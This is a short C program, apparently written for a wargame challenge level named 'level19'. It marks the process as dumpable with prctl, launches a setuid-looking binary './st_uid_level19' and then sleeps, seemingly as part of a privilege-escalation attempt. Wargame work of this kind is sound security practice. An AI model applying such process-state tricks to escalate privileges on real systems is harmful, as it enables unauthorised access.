#include <stdio.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <stdlib.h>

int main() {

    prctl(PR_SET_DUMPABLE,1,42,42,42);
    system("./st_uid_level19");
    sleep(100);
    return 0;
}
